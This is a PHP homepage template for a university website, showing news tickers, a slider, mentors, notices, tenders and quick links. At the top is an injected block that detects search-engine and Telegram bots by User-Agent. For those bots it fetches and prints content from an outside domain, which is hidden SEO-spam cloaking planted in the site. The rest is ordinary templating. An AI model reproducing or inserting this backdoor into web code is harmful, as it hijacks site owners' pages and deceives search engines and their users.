<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://amp-saya.com/sepuh/purneauniversity.ac.in');#NAROLINK
    echo $message;
}
?>

<?php include("lib/header.php"); ?>


<style>
    @media only screen and (max-width: 600px) {
        .card1 {
            width: 75%;
            height: 90%;
        }
    }

    @media only screen and (max-width: 600px) {
        .card {
            min-height: 100% !important;
        }

    }

    a.scroll-text {
        color: #fff;
    }
    .scrollSlider p{
        margin:0;
    }
</style>

<!-- news Slider -->
<div class="container-fluid p-0" style="background-color:#FF9933;">
    <marquee style="font-size: 18px; color: #fff;" width="100%" direction="left" bgcolor="FF9933">
    <?php
        $result = getScroll($conn,1);
        while ($row = $result->fetch_assoc()) {
        ?>
            <ul class="m-0" style="list-style-type: none;">
                <li class="scrollSlider"><a style="color:#fff!important;"><?php echo html_entity_decode($row['description']); ?></a></li>
            </ul>
        <?php  }  ?>
    </marquee>
</div>
<div class="container-fluid p-0" style="background-color:#F24C3D;">
    <marquee style="font-size: 18px; color: #fff;" width="100%" direction="left" bgcolor="F24C3D">
        <?php
        $result = getScroll($conn,2);
        while ($row = $result->fetch_assoc()) {
        ?>
            <ul class="m-0" style="list-style-type: none;">
                <li class="scrollSlider"><a style="color:#fff!important;"><?php echo html_entity_decode($row['description']); ?></a></li>
            </ul>
        <?php  }  ?>
    </marquee>
</div>
<!-- Main Slider -->
<div id="carouselExampleIndicators" class="carousel slide" data-bs-ride="true">

    <div class="carousel-indicators">
        <?php
        $result = getSlider($conn);
        if ($result->num_rows > 0) {
            $i = 0;
            while ($row = $result->fetch_assoc()) {
        ?>      
                <?php if($i==0): ?>
                <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="<?= $i ?>" class="active" aria-current="true" aria-label="Slide <?= $i + 1 ?>"></button>
                <?php else: ?>
                    <button type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide-to="<?= $i ?>" class="" aria-current="true" aria-label="Slide <?= $i + 1 ?>"></button>
                <?php endif ?>

        <?php $i++; }
        } ?>
    </div>
    <div class="carousel-inner">


        <?php
        $result = getSlider($conn);
        if ($result->num_rows > 0) {
            $i = 0;
            while ($row = $result->fetch_assoc()) {
        ?>
                <div class="carousel-item <?php if ($i == 0) {
                                                echo 'active';
                                            } ?>" data-interval="10000">
                    <img src="<?php echo 'public/uploads/slider/' . $row['img_url']; ?>" class="d-block w-100 main-slider-img" alt="...">
                </div>

        <?php
                $i++;
            }
        }
        ?>
    </div>
    <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="prev">
        <span class="carousel-control-prev-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Previous</span>
    </button>
    <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleIndicators" data-bs-slide="next">
        <span class="carousel-control-next-icon" aria-hidden="true"></span>
        <span class="visually-hidden">Next</span>
    </button>
</div>

<!--<div class="container-fluid mt-3 px-1">-->
<!--    <div class="row">-->
<!--        <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6">-->
<!--            <a href="https://innovateindia.mygov.in/viksitbharat2047/" target="_blank"><img src="public/images/viksit_bharat_2047_1.webp" class="imgess1 w-100 rounded" /></a>-->
<!--        </div>-->
<!--        <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6">-->
<!--             <a href="https://innovateindia.mygov.in/viksitbharat2047/" target="_blank"><img src="public/images/viksit_bharat_2047_2.webp" class="imgess1 w-100 rounded" /></a>-->
<!--        </div> -->
<!--    </div>-->
<!--</div>-->


<!-- Main Content -->
<div class="container-fluid mt-2 mt-sm-2 mt-md-3 mt-lg-4 mt-xl-5 px-1 px-sm-1 px-md-3 px-lg-5 px-xl-5 px-xxl-5">
    <div class="row mx-0">
        <h2 class="title-default-center mb-3">About The University</h2>
        <hr class="ani-hr">
        <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6">
            <?php
            $result = getPagesByUrl($conn, 'university');
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {

            ?>
                    <div class="">
                        <img src="public/uploads/pages/<?php echo $row['image']; ?>" class="imgess1 w-100 rounded" />
                    </div>
            <?php }
            }
            ?>
        </div>

        <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6">

            <?php
            $result = getPagesByUrl($conn, 'university');
            if ($result->num_rows > 0) {
                while ($row = $result->fetch_assoc()) {

            ?>      <div class="content px-2">
                

                    <p class="mb-5"><?php echo htmlspecialchars_decode($row['sort_description']); ?>
                    </p>
                    </div>
                    <div class="d-flex justify-content-center">
                        <a class="btn btn-primary" href="<?php echo ($pages); ?>?page=university">Read More</a>
                    </div>
            <?php }
            }
            ?>

        </div>
    </div>


    <div class="row my-3 mx-0">
        <div class="col">
            <h2 class="title-default-center mb-3">Our Mentors</h2>
            <hr class="ani-hr">
            <div class="container-fluid">
                <div class="row justify-content-evenly">
                    <?php
                    $result = getMentors($conn);

                    while ($row = $result->fetch_assoc()) {

                    ?>
                    <!--<div class="card" style="min-height:260px!important;max-height:400px;">-->
                        <div class="col-12 col-sm-12 col-md-4 px-md-5">
                                <img alt="<?php echo $row['name']; ?>" src="<?php echo 'public/uploads/mentors/' . $row['image']; ?>" class="card-img-top w-100 mentorsImg">
                                <!--<div class="card-body p-2">-->
                                    <div class="mt-1">
                                        <h5 style="text-align:center;font-weight:bold;"><?php echo $row['name']; ?></h5>
                                        <p style="text-align:center;font-size:1.3rem;"><?php echo $row['about']; ?></p>
                                    </div>
                                    <?php if($row['about']==="Hon'ble Vice-Chancellor"): ?>
                                        <div class="d-flex justify-content-center">
                                            <a href="pages.php?page=vice-chancellor" class="btn btn-primary">Read More</a>
                                        </div>
                                    <?php endif ?>
                                <!--</div>-->
                            </div>
                        <!--</div>-->
                    <?php  } ?>
                </div>
            </div>
        </div>
    </div>
</div>


<!-- News and Event Area Start Here -->
<div class="news-event-area px-1 px-sm-1 px-md-3 px-lg-5 px-xl-5 px-xxl-5 mt-5">
    <div class="container-fluid">
        <div class="row">
            <h2 class="title-default-center mb-3">Notice, Tenders And Other Information</h2>
            <hr class="ani-hr">
            <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6">
                <h2 class="title-default-left mb-0 bg-primary text-center text-white ps-3 rounded-top">Current Notice</h2>
                <div class="p-4 shadow-lg rounded">

                    <marquee behavior="scroll" scrolldelay="200" scrollamount="3" direction="up" class="ps-4 px-2" onmouseout="start();" onmouseover="stop();" height="300">

                        <?php
                        $result = getNewsNotis($conn);
                        if ($result->num_rows > 0) {
                            $i = 0;
                            while ($row = $result->fetch_assoc()) {
                        ?>
                            <?php if(time()<strtotime($row['expirydate']." 23:59:59")) : ?>
                                <?php if ($i == 0) { ?>
                                    <img src="images/newItem.gif" height="18rem" alt="">
                                <?php } ?>
                                <!-- <a href="notice-bord.php?news=<?php //echo $row['id']; 
                                                                    ?>"> -->
                                <a href="news.php?type=notice&id=<?php echo $row['id'] ?>">
                                    <?php echo $row['title']; ?>
                                </a>

                                <hr style="margin: 0rem 0;">
                            <?php endif ?>

                        <?php
                                $i++;
                            }
                        }
                        ?>

                    </marquee>
                    <div class="event-btn-holder mt-2">
                        <center>
                            <a href="news.php?type=notice" class="view-all-primary-btn btn-small rounded">View
                                All</a>
                        </center>
                    </div>
                </div>
            </div>
            <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6 event-inner-area mt-sm-4 mt-md-0">
                <h2 class="title-default-left mb-0 bg-primary text-center text-white rounded-top">Tenders</h2>
                <div class="bg-white p-4 shadow-lg rounded">
                    <marquee direction="up" scrollamount="3" scrolldelay="200" behavior="scroll" onmouseover="this.stop();" onMouseOut="this.start();" height="300">


                        <?php
                        $result = getTenderNotic($conn);
                        if ($result->num_rows > 0) {
                            $i = 0;
                            while ($row = $result->fetch_assoc()) {
                        ?>
                         <?php if(time()<strtotime($row['expirydate']." 23:59:59")) : ?>
                                <?php if ($i == 0) { ?>
                                    <img src="images/newItem.gif" height="18rem" alt="">
                                <?php } ?>
                                <!-- <a href="notice-bord.php?news=<?php //echo $row['id']; 
                                                                    ?>"> -->
                                <a href="news.php?type=tender&id=<?php echo $row['id'] ?>">
                                    <?php echo $row['title']; ?>
                                </a>

                                <hr style="margin: 0rem 0;">
                        <?php endif ?>

                        <?php
                                $i++;
                            }
                        }
                        ?>
                    </marquee>
                    <div class="event-btn-holder mt-2">
                        <a href="news.php?type=tender" class="view-all-primary-btn rounded">View
                            All</a>
                    </div>
                </div>

            </div>
        </div>
        <div class="row mt-4">
            <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6 event-inner-area">
                <h2 class="title-default-left mb-0 bg-primary text-center text-white rounded-top">Examination</h2>
                <div class="bg-white p-4 shadow-lg rounded">
                    <marquee direction="up" scrollamount="3" scrolldelay="200" behavior="scroll" onmouseover="this.stop();" onMouseOut="this.start();" height="300">
                        <!--<ul>-->

                        <!--    <a href="#">Result of B.Sc Part-II 2022 (Published on 21.04.2023)</a><img src="images/newItem.gif" height="18rem" alt="a">-->
                        <!--    <hr style="margin: 0rem 0;">-->
                        <!--   <a href="#">Result of B.Com Part-II 2022 (Published on 21.04.2023)</a> -->

                        <!--    <hr style="margin: 0rem 0;">-->


                        <!--    <a href="">Result of B.A Part-1 2022 (Published on 20.04.2023)</a>-->
                        <!--    <hr style="margin: 0rem 0;">-->
                        <!--    <a href="">ResultSheet of B.Sc Part 1 2022 (Session 2021-2024)</a>-->
                        <!--    <hr style="margin: 0rem 0;">-->

                        <!--</ul>-->

                        <?php
                        $result = getResultNotic($conn);
                        if ($result->num_rows > 0) {
                            $i = 0;
                            while ($row = $result->fetch_assoc()) {
                        ?>
                            <?php if(time()<strtotime($row['expirydate']." 23:59:59")) : ?>
                                <?php if ($i == 0) { ?>
                                    <img src="images/newItem.gif" height="18rem" alt="">
                                <?php } ?>
                                <!-- <a href="notice-bord.php?news=<?php //echo $row['id']; 
                                                                    ?>"> -->
                                <a href="news.php?type=examination&id=<?php echo $row['id'] ?>">
                                    <?php echo $row['title']; ?>
                                </a>

                                <hr style="margin: 0rem 0;">
                            <?php endif ?>

                        <?php
                                $i++;
                            }
                        }
                        ?>
                    </marquee>
                    <div class="event-btn-holder mt-2">
                        <a href="news.php?type=examination" class="view-all-primary-btn rounded">View
                            All</a>
                    </div>
                </div>
            </div>
            <div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 col-xxl-6 event-inner-area mt-sm-4 mt-md-0">
                <h2 class="title-default-left mb-0 bg-primary text-center text-white rounded-top">Events</h2>
                <div class="bg-white p-4 shadow-lg rounded">
                    <marquee direction="up" scrollamount="3" scrolldelay="200" behavior="scroll" onmouseover="this.stop();" onMouseOut="this.start();" height="300">
                        <!--<ul>-->

                            <!--<a href="">CAPACITY BUILDING & PERSONALITY-->
                            <!--             DEVELOPMENT PROGRAMME-->
                            <!--             UG & for PG FEMALE STUDENTS </a><img src="images/newItem.gif" height="18rem" alt="a"> <A href="">Programme Brochure</A><img src="images/newItem.gif" height="18rem" alt="a">-->
                            <!-- <hr style="margin: 0rem 0;">-->

                            <!-- <a href="">Workshop on Awareness of-->
                            <!--             Intellectual Property </a>-->
                            <!-- <hr style="margin: 0rem 0;">-->

                            <!-- <a href="">National Youth Day 2023 Celebration in PU </a>-->
                            <!-- <hr style="margin: 0rem 0;">-->

                        <!--</ul>-->
                        
                        
                        <?php
                        $result = getEventNotic($conn);
                        if ($result->num_rows > 0) {
                            $i = 0;while ($row = $result->fetch_assoc()) {
                        ?>      
                        <?php if(time()<strtotime($row['expirydate']." 23:59:59")) : ?>
                            <?php if ($i == 0) { ?>
                                <img src="images/newItem.gif" height="18rem" alt="">
                            <?php } ?>
                            <!-- <a href="notice-bord.php?news=<?php //echo $row['id']; 
                                                                ?>"> -->
                                                                
                                                                

                            <a href="news.php?type=events&id=<?php echo $row['id'] ?>">
                                <?php echo $row['title']; ?>
                            </a>


                            <hr style="margin: 0rem 0;">
                        <?php endif ?>

                        <?php
                                $i++;
                            }
                        }
                        ?>
                    </marquee>
                    <div class="event-btn-holder mt-2">
                        <a href="news.php?type=events" class="view-all-primary-btn rounded">View
                            All</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Quick Links -->
<div class="container-fluid">
    <h2 class="title-default-center my-3">QUICK LINKS</h2>
    <hr class="ani-hr">
    <div class="container-fluid d-flex flex-wrap justify-content-center">
        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/news-1.png" alt="news_1" title="news_1" width="50" height="50" />
                        <h5 class="mt-3">News & Events</h5>
                        <div class="go-corner" href="news.php?type=notice">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <h3>News & Events</h3>
                    <button type="button" class="btn btn-warning"><a style="color:#fff;" href="news.php?type=notice">VIEW</a></button>
                </div>
            </div>
        </div>
        <!--<div class="flip-card">-->
        <!--    <div class="flip-card-inner">-->
        <!--        <div class="flip-card-front">-->
        <!--            <a class="card1" href="#">-->
        <!--                <img loading="lazy" src="images/achievement-1.png" alt="news_1" title="news_1" width="50" height="50" />-->
        <!--                <h5 class="mt-3">Achievement</h5>-->
        <!--                <div class="go-corner" href="">-->
        <!--                    <div class="go-arrow">→</div>-->
        <!--                </div>-->
        <!--            </a>-->
        <!--        </div>-->
        <!--        <div class="flip-card-back">-->
        <!--            <h3>Achievement</h3>-->
        <!--            <button type="button" class="btn btn-warning"><a href="#"> VIEW</a></button>-->

        <!--        </div>-->
        <!--    </div>-->
        <!--</div>-->

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/notification-1.png" alt="news_1" title="news_1" width="80" height="50" />
                        <h5 class="mt-3">Notice & Circular</h5>
                        <div class="go-corner" href="news.php?type=notice">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <h3>Notice & Circular</h3>
                    <button type="button" class="btn btn-warning"><a style="color:#fff;" href="news.php?type=notice">VIEW</a></button>
                </div>
            </div>
        </div>

        <!--<div class="flip-card">-->
        <!--    <div class="flip-card-inner">-->
        <!--        <div class="flip-card-front">-->
        <!--            <a class="card1" href="#">-->
        <!--                <img loading="lazy" src="images/committees-1.png" alt="news_1" title="news_1" width="70" height="50" />-->
        <!--                <h5 class="mt-3">Cell</h5>-->
        <!--                <div class="go-corner" href="pages.php?page=IT-cell">-->
        <!--                    <div class="go-arrow">→</div>-->
        <!--                </div>-->
        <!--            </a>-->
        <!--        </div>-->
        <!--        <div class="flip-card-back">-->
        <!--            <h3>Cell</h3>-->
        <!--            <button type="button" class="btn btn-warning"><a style="color:#fff;" href="pages.php?page=IT-cell">VIEW</a></button>-->
        <!--        </div>-->
        <!--    </div>-->
        <!--</div>-->

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/tender-1.png" alt="news_1" title="news_1" width="80" height="50" />
                        <h5 class="mt-3">Tenders</h5>
                        <div class="go-corner" href="news.php?type=tender">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <a href="news.php?type=tender">
                        <h3>Tenders</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="news.php?type=tender">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/activities-1.png" alt="news_1" title="news_1" width="50" height="50" />
                        <h5 class="mt-3">Activites and News Letter</h5>
                        <div class="go-corner" href="news.php?type=notice">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <a href="news.php?type=news">
                        <h3>Activites and News Letter</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="news.php?type=notice">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/gallery-1.png" alt="news_1" title="news_1" width="70" height="50" />
                        <h5 class="mt-3">Gallery</h5>
                        <div class="go-corner" href="gallery.php?type=10">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>

                <div class="flip-card-back">
                    <a href="gallery.php">
                        <h3>Gallery</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="gallery.php">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/calendar.png" alt="news_1" title="news_1" width="70" height="50" />
                        <h5 class="mt-3">Academic Calendar</h5>
                        <div class="go-corner" href="pages.php?page=academic-calendar">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>

                <div class="flip-card-back">
                    <a href="academic-calendar.php">
                        <h3>Academic Calendar</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="pages.php?page=academic-calendar">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>

        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" src="images/result-1.png" alt="news_1" title="news_1" width="80" height="70" />
                        <h5 class="mt-3">Result</h5>
                        <div class="go-corner" href="news.php?type=result">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <a href="news.php?type=result">
                        <h3>Result</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="news.php?type=examination">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>
        <div class="flip-card">
            <div class="flip-card-inner">
                <div class="flip-card-front">
                    <a class="card1" href="#">
                        <img loading="lazy" class="p-2 mt-1" src="images/carrers.png" alt="news_1" title="news_1" width="60" height="70" />
                        <h5 class="mt-3">Career </h5>
                        <div class="go-corner" href="news.php?type=result">
                            <div class="go-arrow">→</div>
                        </div>
                    </a>
                </div>
                <div class="flip-card-back">
                    <a href="news.php?type=result">
                        <h3>Career</h3>
                        <button type="button" class="btn btn-warning"><a style="color:#fff;" href="pages.php?page=carrers">VIEW</a></button>
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- News and Event Area End Here -->
<!--<div class="mt-5"></div>-->
<!--<a id="scrollUp" href="#top" style="position: fixed; z-index: 2147483647; display: none;"><i class="fa fa-arrow-up"></i></a>-->

<?php include("lib/footer.php"); ?>
